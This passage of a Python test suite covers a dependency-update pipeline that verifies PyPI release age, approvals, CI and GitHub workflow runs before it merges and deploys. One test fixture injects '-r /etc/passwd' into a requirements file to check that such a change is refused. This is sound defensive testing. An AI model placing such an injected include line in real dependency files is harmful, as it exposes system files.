            {'digests': {'sha256': digest}, 'upload_time_iso_8601': '2026-10-02T12:00:00Z', 'yanked': False}
            for digest in hashes]}
        with patch('dependency_updates.release_age.PyPI.release', return_value=metadata):
            plan = self.plan()
            self.assertLess(len(base64.b64encode(policy.canonical(plan).encode())), 48_000)
            release = plan['python_age']['locks'][0]['releases'][0]
            self.assertEqual(release['artifact_count'], 1000)
            self.assertRegex(release['artifacts_sha256'], r'^[0-9a-f]{64}$')
            # A changed oldest timestamp still invalidates the digest even
            # when the count and latest publication remain the same.
            metadata['urls'][0]['upload_time_iso_8601'] = '2026-10-01T12:00:00Z'
            with self.assertRaises(policy.Refused):
                self.execute(plan)
        self.assertEqual(self.mutations, [])

    def test_security_bypass_is_explicit_and_only_emergency_namespace_can_use_it(self):
        metadata = self.python_candidate('2026-10-09T00:00:00Z')
        self.branch = 'dependency-security/critical'
        self.author = 'enjoydarts'
        self.labels = [{'name': 'dependency-security'}]
        self.body = 'Security fix: critical advisory'
        with patch('dependency_updates.release_age.PyPI.release', side_effect=AssertionError('Explicit emergency exemption')):
            self.assertEqual(self.plan()['python_age'], {'policy': 'emergency-security-bypass', 'cutoff': None, 'locks': []})
        self.branch = 'renovate-ci/python'
        self.author = 'github-actions[bot]'
        with patch('dependency_updates.release_age.PyPI.release', return_value=metadata), self.assertRaises(policy.Refused):
            self.plan()

    def test_approved_candidate_merges_once_then_explicitly_deploys_exact_merge(self):
        self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[0][2]['sha'], SHA)
        self.assertEqual(self.mutations[1][2]['inputs']['expected_commit'], self.merged)
        self.assertEqual(self.mutations[1][2]['inputs']['approval_run'], '10')
        self.assertFalse(any('/renovate.yml/' in mutation[1] for mutation in self.mutations))

    def test_failed_deploy_never_requests_next_proposals(self):
        transport = self.transport
        def controlled(method, path, body):
            value = transport(method, path, body)
            if '/actions/workflows/deploy.yml/runs' in path:
                for run in value['workflow_runs']:
                    run['conclusion'] = 'failure'
            return value
        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Dispatched workflow failed'):
            self.execute(self.plan())
        self.assertEqual(self.image_events, [('revalidate', SHA)])
        self.assertFalse(any('/renovate.yml/' in mutation[1] for mutation in self.mutations))

    def test_main_drift_after_successful_deploy_prevents_next_proposal_request(self):
        transport = self.transport
        def controlled(method, path, body):
            if path.split('?')[0] == '/git/ref/heads/main' and any('/deploy.yml/dispatches' in m[1] for m in self.mutations):
                return {'object': {'sha': 'd' * 40}}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Main advanced after deployment'):
            self.execute(self.plan())
        self.assertFalse(any('/renovate.yml/' in mutation[1] for mutation in self.mutations))

    def test_next_proposal_is_deferred_until_parent_fully_completes(self):
        plan = self.plan()
        self.execute(plan)
        self.assertIn('All affected deployments succeeded', self.summary)
        self.assertIn('after this native approval workflow fully completes', self.summary)
        self.assertIn('daily Renovate scan', self.summary)
        self.assertFalse(any('/renovate.yml/' in mutation[1] for mutation in self.mutations))
        before = list(self.mutations)
        with patch.dict(os.environ, {'GITHUB_RUN_ATTEMPT': '2'}), self.assertRaises(policy.Refused):
            pipeline.execute(self.api, plan, policy.plan_hash(plan))
        self.assertEqual(self.mutations, before)

    def delayed_deployments(self, clock, ready_after, conclusion='success'):
        transport = self.transport

        def controlled(method, path, body):
            workflows = ('deploy.yml', 'deploy-audio-concat.yml')
            for index, workflow in enumerate(workflows):
                if '/actions/workflows/' + workflow + '/runs' in path:
                    dispatched = any(m[1] == '/actions/workflows/' + workflow + '/dispatches' for m in self.mutations)
                    completed = clock.elapsed >= ready_after.get(workflow, float('inf'))
                    run = {'id': 16 + index, 'event': 'workflow_dispatch', 'head_sha': self.merged,
                           'path': '.github/workflows/' + workflow,
                           'status': 'completed' if completed else 'in_progress',
                           'conclusion': conclusion if completed else None}
                    # A successful foreign head must never satisfy this wait.
                    foreign = dict(run, id=99, head_sha='d' * 40, status='completed', conclusion='success')
                    return {'workflow_runs': [foreign, run] if dispatched else [], 'total_count': 2 if dispatched else 0}
            return transport(method, path, body)

        self.api = github.GitHub(self.repo, transport=controlled)

    def test_application_and_audio_can_each_succeed_after_thirty_minutes(self):
        self.paths.extend(['infra/audio-concat/requirements.in', 'infra/audio-concat/requirements.txt'])
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 31 * 60, 'deploy-audio-concat.yml': 62 * 60})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            self.execute(self.plan())
        self.assertEqual(clock.elapsed, 62 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST', 'POST'])
        for mutation in self.mutations[1:]:
            self.assertEqual(mutation[2]['ref'], 'main')
            self.assertEqual(mutation[2]['inputs'], {'expected_commit': self.merged, 'approval_run': '10', 'approved_pr': '1', 'approved_head': SHA, 'approved_base': BASE})

    def test_deployment_deadline_expires_once_without_merge_or_dispatch_replay(self):
        self.paths.extend(['infra/audio-concat/requirements.in', 'infra/audio-concat/requirements.txt'])
        clock = FakeClock()
        self.delayed_deployments(clock, {})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 145 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[1][1], '/actions/workflows/deploy.yml/dispatches')

    def test_audio_deadline_expires_once_after_application_success(self):
        self.paths.extend(['infra/audio-concat/requirements.in', 'infra/audio-concat/requirements.txt'])
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 0})
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 50 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST', 'POST'])
        self.assertEqual(self.mutations[-1][1], '/actions/workflows/deploy-audio-concat.yml/dispatches')

    def test_failed_deployment_after_thirty_minutes_stops_without_audio_or_replay(self):
        self.paths.extend(['infra/audio-concat/requirements.in', 'infra/audio-concat/requirements.txt'])
        clock = FakeClock()
        self.delayed_deployments(clock, {'deploy.yml': 31 * 60}, conclusion='failure')
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Dispatched workflow failed'):
                self.execute(self.plan())
        self.assertEqual(clock.elapsed, 31 * 60)
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])

    def test_wrong_deployment_path_stops_after_single_merge_and_dispatch(self):
        transport = self.transport

        def controlled(method, path, body):
            result = transport(method, path, body)
            if '/actions/workflows/deploy.yml/runs' in path:
                for run in result['workflow_runs']:
                    run['path'] = '.github/workflows/spoof.yml'
            return result

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Unexpected deployment workflow'):
            self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])

    def test_nonrequired_preview_failure_does_not_block_verified_dependency_merge(self):
        # GitHub reports unstable when optional preview checks fail; the four
        # exact-head dependency jobs still succeed and PUT uses normal rules.
        self.mergeable_state = 'unstable'
        self.preview_failure = True
        self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.mutations[0][2], {'sha': SHA, 'merge_method': 'merge', 'commit_title': 'Approved dependency update PR #1'})

    def test_unstable_pr_with_failed_fixed_ci_still_cannot_merge(self):
        self.mergeable_state = 'unstable'
        plan = self.plan()
        transport = self.transport

        def controlled(method, path, body):
            result = transport(method, path, body)
            if path.split('?')[0].endswith('/jobs'):
                result['jobs'][0]['conclusion'] = 'failure'
            return result

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'four exact-head CI jobs'):
            self.execute(plan)
        self.assertEqual(self.mutations, [])

    def test_native_merge_rejection_of_unstable_pr_cannot_start_deployment(self):
        self.mergeable_state = 'unstable'
        transport = self.transport

        def controlled(method, path, body):
            if method == 'PUT':
                self.mutations.append((method, path, body))
                return {'merged': False}
            return transport(method, path, body)

        self.api = github.GitHub(self.repo, transport=controlled)
        with self.assertRaisesRegex(policy.Refused, 'Protected branch merge rejected'):
            self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT'])
        self.assertFalse(any('/renovate.yml/' in mutation[1] for mutation in self.mutations))

    def test_blocked_behind_dirty_and_unknown_merge_states_cannot_attempt_merge(self):
        for state in ['blocked', 'behind', 'dirty', 'unknown', None, '']:
            with self.subTest(state=state):
                self.setUp()
                self.mergeable_state = state
                with self.assertRaisesRegex(policy.Refused, 'ready to merge'):
                    self.execute(self.plan())
                self.assertEqual(self.mutations, [])

    def test_unverified_python_hash_diff_is_refused_and_emergency_summary_keeps_full_blob(self):
        import base64
        import hashlib
        import re
        original = (Path('/repository') / 'worker/requirements.txt').read_text()
        updated = re.sub(r'sha256:([0-9a-f]{64})', lambda match: 'sha256:' + hashlib.sha256(match[1].encode()).hexdigest(), original)
        self.paths = ['worker/requirements.txt']
        transport = self.transport
        def content_transport(method, path, body):
            if path.startswith('/contents/'):
                text = original if 'ref=' + BASE in path else updated
                return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=content_transport)
        # Arbitrary hash changes are never normal candidates without official
        # artifact evidence. The explicit legacy emergency exemption retains
        # the existing bounded summary/full-blob approval contract.
        with patch('dependency_updates.release_age.PyPI.release', side_effect=policy.Refused('Unverified artifact')):
            with self.assertRaises(policy.Refused):
                self.plan()
        self.branch = 'dependency-security/hash-fixture'
        self.author = 'enjoydarts'
        self.labels = [{'name': 'dependency-security'}]
        self.body = 'Security fix: controlled summary fixture'
        plan = self.plan()
        self.assertLess(len(policy.canonical(plan)), 48_000)
        entry = plan['files'][0]
        self.assertLess(sum(map(len, entry['changes'])), 12_000)
        self.assertEqual(entry['after'], hashlib.sha256(updated.encode()).hexdigest())
        digest = policy.plan_hash(plan)
        updated = updated.replace('anyio==4.15.1', 'anyio==4.15.2')
        with self.assertRaises(policy.Refused):
            policy.assert_unchanged(plan, self.plan(), digest)

    def test_large_npm_diff_uses_complete_summary_and_keeps_full_blob_hashes(self):
        import base64
        import hashlib
        original = {'lockfileVersion': 3, 'packages': {'': {'dependencies': {'dep': '^1.0.0'}}}}
        for index in range(200):
            original['packages']['node_modules/pkg%03d' % index] = {
                'version': '1.0.0', 'integrity': 'sha512-' + base64.b64encode(bytes(64)).decode()}
        updated = json.loads(json.dumps(original))
        for package in updated['packages'].values():
            if 'version' in package:
                package['version'] = '1.0.1'
                package['integrity'] = 'sha512-' + base64.b64encode(bytes([1]) * 64).decode()
        original, updated = json.dumps(original, indent=2), json.dumps(updated, indent=2)
        self.paths = ['web/package-lock.json']
        transport = self.transport
        def content_transport(method, path, body):
            if path.startswith('/contents/'):
                text = original if 'ref=' + BASE in path else updated
                return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=content_transport)
        plan = self.plan()
        self.assertLess(len(policy.canonical(plan)), 48_000)
        entry = plan['files'][0]
        self.assertEqual(len(entry['changes']), 201)
        self.assertEqual(entry['before'], hashlib.sha256(original.encode()).hexdigest())
        self.assertEqual(entry['after'], hashlib.sha256(updated.encode()).hexdigest())
        self.assertEqual(plan['diff_hash'], policy.plan_hash(plan['files']))
        self.assertEqual((plan['head'], plan['base'], plan['source']), (SHA, BASE, BASE))
        digest = policy.plan_hash(plan)
        # Even a full-blob formatting change with identical semantic rows
        # invalidates the exact prepared candidate and its approval.
        updated += '\n'
        with self.assertRaises(policy.Refused):
            policy.assert_unchanged(plan, self.plan(), digest)
        self.assertEqual(self.mutations, [])

    def test_no_approval_or_stale_head_base_diff_or_wrong_check_never_merges(self):
        for changed in ['approval', 'head', 'base', 'diff', 'check']:
            with self.subTest(changed=changed):
                self.setUp()
                plan = self.plan()
                if changed == 'approval': self.approvals = []
                if changed == 'head': self.head = 'd' * 40
                if changed == 'base': self.base = 'd' * 40
                if changed == 'diff': self.after = 'httpx==0.30.0\n'
                if changed == 'check': self.check_path = '.github/workflows/spoof.yml'
                with self.assertRaises(policy.Refused): self.execute(plan)
                self.assertEqual(self.mutations, [])

    def test_forks_authors_native_sources_and_missing_metadata_are_refused(self):
        for changed in ['fork', 'author', 'scope', 'script']:
            with self.subTest(changed=changed):
                self.setUp()
                if changed == 'fork': self.fork = True
                if changed == 'author': self.author = 'external-user'
                if changed == 'scope': self.paths = ['api/main.go']
                if changed == 'script': self.after = '-r /etc/passwd\n'
                with self.assertRaises(policy.Refused): self.plan()
                self.assertEqual(self.mutations, [])

    def test_dependency_branch_namespace_requires_its_exact_author(self):
        cases = [
            ('renovate-ci/pip-minor-patch', 'github-actions[bot]', False, True),
            ('dependency-security/fix-httpx', 'enjoydarts', True, True),
            ('renovate-ci/pip-minor-patch', 'enjoydarts', False, False),
            ('dependency-security/fix-httpx', 'github-actions[bot]', True, False),
        ]
        for branch, author, emergency, accepted in cases:
            with self.subTest(branch=branch, author=author):
                self.setUp()
                self.branch, self.author = branch, author
                self.labels = [{'name': 'dependency-security'}]
                self.body = 'Security fix: update the vulnerable httpx dependency.'
                if accepted:
                    self.assertEqual(self.plan()['emergency'], emergency)
                else:
                    with self.assertRaises(policy.Refused): self.plan()
                self.assertEqual(self.mutations, [])

    def test_identical_candidate_requests_are_deduplicated_across_run_history(self):
        plan = self.plan()
        title = pipeline.run_name(plan)
        api = github.GitHub(self.repo, transport=lambda *_: {'workflow_runs': [{'display_title': title}], 'total_count': 1})
        self.assertTrue(pipeline.deduplicated(api, plan))

    def test_ci_fixture_and_development_only_updates_do_not_deploy_live_services(self):
        plan = self.plan()
        # Candidate validation is real; the only substituted boundary is the
        # already tested immutable snapshot, with declared config-only targets.
        plan['surfaces'] = ['ci', 'development']
        with patch.object(pipeline, 'candidate', return_value={k: v for k, v in plan.items() if k != 'ci_run'}):
            self.execute(plan)
        self.assertEqual([m[0] for m in self.mutations], ['PUT'])
        self.assertIn('after this native approval workflow fully completes', self.summary)

    def test_retry_attempt_cannot_reuse_native_approval(self):
        plan = self.plan()
        with patch.dict(os.environ, {'GITHUB_RUN_ATTEMPT': '2'}):
            with self.assertRaises(policy.Refused):
                pipeline.execute(self.api, plan, policy.plan_hash(plan))
        self.assertEqual(self.mutations, [])


class WorkflowWaitTests(unittest.TestCase):
    def test_shared_pr_deadline_expiring_in_dispatch_inventory_prevents_post(self):
        clock = FakeClock()
        mutations = []
        def remaining():
            policy.require(clock.elapsed < 20, 'Timed out waiting for exact PR CI')
            return 20 - clock.elapsed
        def transport(method, path, body):
            if method == 'POST': mutations.append((path, body))
            clock.elapsed += 21
            return {'workflow_runs': [], 'total_count': 0}
        api = github.GitHub('owner/repo', transport=transport)
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            try:
                pipeline.dispatch_once(api, 'dependency-check.yml', 'renovate-ci/pip', SHA,
                                       {'expected_head': SHA}, remaining_budget=remaining)
            except TypeError:
                self.fail('Dispatch must accept the shared remaining-budget authority')
            except policy.Refused as exc:
                self.assertIn('Timed out', str(exc))
            else:
                self.fail('Expired shared PR deadline must stop dispatch')
        self.assertEqual(mutations, [])

    def test_shared_pr_deadline_includes_post_and_wait_api_latency_without_replay(self):
        for expires_in in ('POST', 'wait_GET'):
            with self.subTest(expires_in=expires_in):
                clock = FakeClock()
                mutations = []
                def remaining():
                    policy.require(clock.elapsed < 20, 'Timed out waiting for exact PR CI')
                    return 20 - clock.elapsed
                def transport(method, path, body):
                    if method == 'POST':
                        mutations.append((path, body))
                        clock.elapsed += 21 if expires_in == 'POST' else 12
                        return None
                    if mutations:
                        clock.elapsed += 9
                        run = {'id': 16, 'event': 'workflow_dispatch', 'head_sha': SHA,
                               'path': '.github/workflows/dependency-check.yml', 'status': 'completed', 'conclusion': 'success'}
                        return {'workflow_runs': [run], 'total_count': 1}
                    return {'workflow_runs': [], 'total_count': 0}
                api = github.GitHub('owner/repo', transport=transport)
                with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
                    try:
                        pipeline.dispatch_once(api, 'dependency-check.yml', 'renovate-ci/pip', SHA,
                                               {'expected_head': SHA}, remaining_budget=remaining)
                    except TypeError:
                        self.fail('Dispatch must accept the shared remaining-budget authority')
                    except policy.Refused as exc:
                        self.assertIn('Timed out', str(exc))
                    else:
                        self.fail('Expired shared PR deadline must reject even successful CI')
                self.assertEqual(len(mutations), 1)
                self.assertEqual(clock.elapsed, 21)

    def test_ci_has_its_own_short_finite_deadline_without_redispatch(self):
        clock = FakeClock()
        mutations = []

        def transport(method, path, body):
            if method == 'POST':
                mutations.append((path, body))
            return {'workflow_runs': [], 'total_count': 0}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.dispatch_once(api, 'dependency-check.yml', 'renovate-ci/pip', SHA, {'expected_head': SHA})
        self.assertEqual(clock.elapsed, 35 * 60)
        self.assertEqual(len(mutations), 1)

    def test_wait_deadline_includes_api_latency_and_does_not_reset_on_new_polls(self):
        clock = FakeClock()

        def transport(*args):
            clock.elapsed += 3
            return {'workflow_runs': [], 'total_count': 0}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.await_run(api, 'deploy.yml', SHA, 0, timeout_seconds=20)
        self.assertEqual(clock.elapsed, 20)

    def test_success_response_after_wait_deadline_cannot_authorize_next_deployment(self):
        clock = FakeClock()
        mutations = []

        def transport(method, path, body):
            if method == 'POST':
                mutations.append((path, body))
                return None
            if not mutations:
                return {'workflow_runs': [], 'total_count': 0}
            clock.elapsed += 21
            run = {'id': 16, 'event': 'workflow_dispatch', 'head_sha': SHA,
                   'path': '.github/workflows/deploy.yml', 'status': 'completed', 'conclusion': 'success'}
            return {'workflow_runs': [run], 'total_count': 1}

        api = github.GitHub('owner/repo', transport=transport)
        with patch.dict(pipeline.RUN_WAIT_SECONDS, {'deploy.yml': 20}), patch.object(pipeline.time, 'monotonic', clock.monotonic), patch.object(pipeline.time, 'sleep', clock.sleep):
            with self.assertRaisesRegex(policy.Refused, 'Timed out waiting for exact workflow run'):
                pipeline.dispatch_once(api, 'deploy.yml', 'main', SHA, {'expected_commit': SHA})
        self.assertEqual(clock.elapsed, 21)
        self.assertEqual(mutations, [('/actions/workflows/deploy.yml/dispatches', {'ref': 'main', 'inputs': {'expected_commit': SHA}})])


class DeploymentAuthorizationTests(unittest.TestCase):
    def setUp(self):
        from dependency_updates import deploy
        self.deploy = deploy
        self.fixture = PipelineTests()
        self.fixture.setUp()
        self.addCleanup(self.fixture.doCleanups)
        self.fixture.base = self.fixture.merged
        self.override = ''
        self.api = github.GitHub(self.fixture.repo, transport=self.transport)
        self.environment = {'EXPECTED_COMMIT': self.fixture.merged, 'GITHUB_SHA': self.fixture.merged, 'GITHUB_REF': 'refs/heads/main', 'GITHUB_EVENT_NAME': 'workflow_dispatch', 'GITHUB_RUN_ID': '20', 'GITHUB_RUN_ATTEMPT': '1', 'GITHUB_WORKFLOW_REF': self.fixture.repo + '/.github/workflows/deploy.yml@refs/heads/main', 'APPROVAL_RUN': '10', 'APPROVED_PR': '1', 'APPROVED_HEAD': SHA, 'APPROVED_BASE': BASE}

    def transport(self, method, path, body):
        if '/actions/workflows/deploy.yml/runs' in path:
            rows = [{'id': 20, 'display_title': 'Approved dependency deployment 10 ' + self.fixture.merged}]
            if self.override == 'duplicate': rows.append(dict(rows[0], id=21))
            return {'workflow_runs': rows, 'total_count': len(rows)}
        if path == '/git/commits/' + self.fixture.merged:
            return {'parents': [] if self.override == 'parents' else [{'sha': BASE}, {'sha': SHA}]}
        if path == '/pulls/1':
            value = self.fixture.transport(method, path, body)
            value.update(merged=True, merge_commit_sha=self.fixture.merged)
            return value
        if path == '/actions/runs/10' and self.override == 'source':
            return dict(self.fixture.transport(method, path, body), head_sha=SHA)
        return self.fixture.transport(method, path, body)

    def test_deploy_requires_actual_approved_source_and_exact_merged_parents(self):
        with patch.dict(os.environ, self.environment):
            self.assertEqual(self.deploy.authorize(self.api), self.fixture.merged)
        self.assertEqual(self.fixture.mutations, [])

    def test_chat_flags_stale_pr_and_reused_approval_cannot_authorize_deployment(self):
        for condition in ['approval', 'source', 'parents', 'duplicate', 'head', 'base', 'rerun', 'ref']:
            with self.subTest(condition=condition):
                self.setUp()
                if condition in {'source', 'parents', 'duplicate'}: self.override = condition
                if condition == 'approval': self.fixture.approvals = []
                if condition == 'head': self.fixture.head = 'd' * 40
                if condition == 'base': self.fixture.base = 'd' * 40
                if condition == 'rerun': self.environment['GITHUB_RUN_ATTEMPT'] = '2'
                if condition == 'ref': self.environment['GITHUB_REF'] = 'refs/heads/untrusted'
                with patch.dict(os.environ, self.environment):
                    with self.assertRaises(policy.Refused): self.deploy.authorize(self.api)
                self.assertEqual(self.fixture.mutations, [])


class ReproposalTests(unittest.TestCase):
    def setUp(self):
        self.plan = {'pr': 1, 'head': SHA, 'base': BASE, 'source': BASE}
        self.run = {'id': 10, 'display_title': pipeline.run_name(self.plan), 'status': 'completed', 'conclusion': 'failure', 'event': 'workflow_dispatch', 'head_sha': BASE, 'head_branch': 'main', 'path': '.github/workflows/dependency-update.yml', 'run_attempt': 1}
        self.approvals = []
        self.jobs = [
            {'id': 101, 'run_id': 10, 'head_sha': BASE, 'name': 'prepare', 'status': 'completed', 'conclusion': 'failure', 'steps': [{'name': 'Run candidate CI', 'status': 'completed', 'conclusion': 'failure'}], 'runner_id': 1, 'runner_name': 'hosted'},
            {'id': 102, 'run_id': 10, 'head_sha': BASE, 'name': 'approve-merge-deploy', 'status': 'completed', 'conclusion': 'skipped', 'steps': [], 'runner_id': 0, 'runner_name': ''},
        ]
        self.pages_override = None
        self.mutations = []
        self.reads = []
        self.api = github.GitHub('owner/repo', transport=self.transport)

    def transport(self, method, path, body):
        if method != 'GET':
            self.mutations.append((method, path, body))
            return None
        self.reads.append(path)
        endpoint = path.split('?')[0]
        if endpoint == '/actions/workflows/dependency-update.yml/runs':
            return {'workflow_runs': [dict(self.run)], 'total_count': 1}
        if endpoint == '/actions/runs/10': return dict(self.run)
        if endpoint == '/actions/runs/10/approvals': return self.approvals
        if endpoint == '/actions/runs/10/jobs':
            if self.pages_override is not None: return self.pages_override
            return {'jobs': self.jobs, 'total_count': len(self.jobs)}
        raise AssertionError('Unexpected controlled read: ' + path)

    def test_completed_unapproved_prepare_failure_allows_a_fresh_run(self):
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))
        self.assertTrue(any('jobs?filter=all' in path for path in self.reads))
        self.assertIn('/actions/runs/10/approvals', self.reads)
        self.assertEqual(self.mutations, [])

    def test_actual_skipped_job_with_null_runner_name_allows_fresh_run(self):
        # GitHub run 37584435913 / skipped job 112674138148 returns null,
        # unlike an assigned runner or an absent field in incomplete metadata.
        self.jobs[1]['runner_name'] = None
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))

    def test_daily_discovery_dispatches_a_fresh_run_after_unconsumed_prepare_failure(self):
        fixture = PipelineTests()
        fixture.setUp()
        self.addCleanup(fixture.doCleanups)
        original = self.transport
        def transport(method, path, body):
            if path.split('?')[0] == '/pulls':
                return [{'number': 1, 'head': {'sha': SHA}}]
            if path.startswith('/actions/'):
                return original(method, path, body)
            return fixture.transport(method, path, body)
        api = github.GitHub('owner/repo', transport=transport)
        with patch.dict(os.environ, {'GITHUB_SHA': BASE}):
            pipeline.discover(api)
        self.assertEqual(self.mutations, [('POST', '/actions/workflows/dependency-update.yml/dispatches', {'ref': 'main', 'inputs': {'pr_number': '1', 'head_sha': SHA, 'base_sha': BASE, 'source_sha': BASE}})])

    def test_daily_discovery_respects_owner_denial_without_redispatch(self):
        fixture = PipelineTests()
        fixture.setUp()
        self.addCleanup(fixture.doCleanups)
        self.approvals = [{'state': 'rejected', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        original = self.transport
        def transport(method, path, body):
            if path.split('?')[0] == '/pulls':
                return [{'number': 1, 'head': {'sha': SHA}}]
            if path.startswith('/actions/'):
                return original(method, path, body)
            return fixture.transport(method, path, body)
        with patch.dict(os.environ, {'GITHUB_SHA': BASE}):
            pipeline.discover(github.GitHub('owner/repo', transport=transport))
        self.assertEqual(self.mutations, [])

    def test_cancelled_prepare_before_gate_allows_a_fresh_run(self):
        self.run['conclusion'] = 'cancelled'
        self.jobs[0]['conclusion'] = 'cancelled'
        self.jobs[1].update(conclusion='cancelled', started_at=None)
        self.assertFalse(pipeline.deduplicated(self.api, self.plan))

    def test_active_consumed_denied_or_uncertain_history_suppresses_reproposal(self):
        conditions = ['active', 'success', 'run_attempt', 'source', 'missing_run_attempt', 'approved', 'denied', 'malformed_approvals', 'missing_jobs', 'unknown_jobs', 'foreign_job', 'missing_steps', 'missing_runner_name', 'started_merge', 'cancelled_after_start', 'prepare_success', 'prepare_unknown']
        for condition in conditions:
            with self.subTest(condition=condition):
                self.setUp()
                if condition == 'active': self.run['status'] = 'in_progress'
                if condition == 'success': self.run['conclusion'] = 'success'
                if condition == 'run_attempt': self.run['run_attempt'] = 2
                if condition == 'source': self.run['head_sha'] = SHA
                if condition == 'missing_run_attempt': del self.run['run_attempt']
                if condition in {'approved', 'denied'}:
                    self.approvals = [{'state': 'approved' if condition == 'approved' else 'rejected', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
                if condition == 'malformed_approvals': self.approvals = {}
                if condition == 'missing_jobs': self.jobs = self.jobs[:1]
                if condition == 'unknown_jobs': self.jobs.append(dict(self.jobs[0], id=103, name='execute'))
                if condition == 'foreign_job': self.jobs[1]['head_sha'] = SHA
                if condition == 'missing_steps': del self.jobs[1]['steps']
                if condition == 'missing_runner_name': del self.jobs[1]['runner_name']
                if condition == 'started_merge': self.jobs[1].update(conclusion='failure', runner_id=2, runner_name='hosted', steps=[{'name': 'Merge and deploy', 'status': 'completed', 'conclusion': 'failure'}])
                if condition == 'cancelled_after_start': self.jobs[1].update(conclusion='cancelled', started_at='2026-10-12T00:00:00Z')
                if condition == 'prepare_success': self.jobs[0]['conclusion'] = 'success'
                if condition == 'prepare_unknown': self.jobs[0]['conclusion'] = None
                self.assertTrue(pipeline.deduplicated(self.api, self.plan))
                self.assertEqual(self.mutations, [])

    def test_incomplete_or_unbounded_job_pagination_never_allows_reproposal(self):
        for response in [{'jobs': self.jobs[:1], 'total_count': 2}, {'jobs': self.jobs}, {'jobs': [self.jobs[0]] * 100, 'total_count': 2001}]:
            with self.subTest(response_keys=list(response)):
                self.pages_override = response
                with self.assertRaises(policy.Refused):
                    pipeline.deduplicated(self.api, self.plan)
                self.assertEqual(self.mutations, [])

    def test_one_consumed_run_suppresses_even_after_an_unconsumed_failure(self):
        original = self.transport
        def transport(method, path, body):
            if '/actions/workflows/dependency-update.yml/runs' in path:
                return {'workflow_runs': [dict(self.run), dict(self.run, id=11, status='in_progress', conclusion=None)], 'total_count': 2}
            return original(method, path, body)
        self.api = github.GitHub('owner/repo', transport=transport)
        self.assertTrue(pipeline.deduplicated(self.api, self.plan))


class SerialDiscoveryTests(unittest.TestCase):
    """Exercise complete native-run inventories before dispatching one proposal."""
    def setUp(self):
        self.fixture = PipelineTests()
        self.fixture.setUp()
        self.addCleanup(self.fixture.doCleanups)
        self.runs = []
        self.inventory = None
        self.reads = []
        self.api = github.GitHub('owner/repo', transport=self.transport)

    def active(self, status='waiting'):
        return {'id': 20, 'display_title': 'Dependency PR 9 ' + SHA + ' ' + BASE,
                'status': status, 'conclusion': None, 'event': 'workflow_dispatch',
                'head_sha': BASE, 'head_branch': 'main',
                'path': '.github/workflows/dependency-update.yml', 'run_attempt': 1}

    def transport(self, method, path, body):
        if method == 'GET':
            self.reads.append(path)
            endpoint = path.split('?')[0]
            if endpoint == '/pulls':
                return [{'number': number, 'head': {'sha': SHA}} for number in (1, 2)]
            if endpoint == '/actions/workflows/dependency-update.yml/runs':
                return self.inventory if self.inventory is not None else {
                    'workflow_runs': self.runs, 'total_count': len(self.runs)}
            if endpoint.startswith('/pulls/2'):
                path = path.replace('/pulls/2', '/pulls/1', 1)
        return self.fixture.transport(method, path, body)

    def discover(self):
        with patch.dict(os.environ, {'GITHUB_SHA': BASE}):
            pipeline.discover(self.api)

    def test_active_waiting_and_queued_runs_block_every_new_candidate(self):
        for status in ('in_progress', 'waiting', 'queued', 'requested', 'pending'):
            with self.subTest(status=status):
                self.setUp()
                self.runs = [self.active(status)]
                self.discover()
                self.assertEqual(self.fixture.mutations, [])
                self.assertFalse(any(path.startswith('/pulls') for path in self.reads))

    def test_two_eligible_candidates_dispatch_only_the_first(self):
        self.discover()
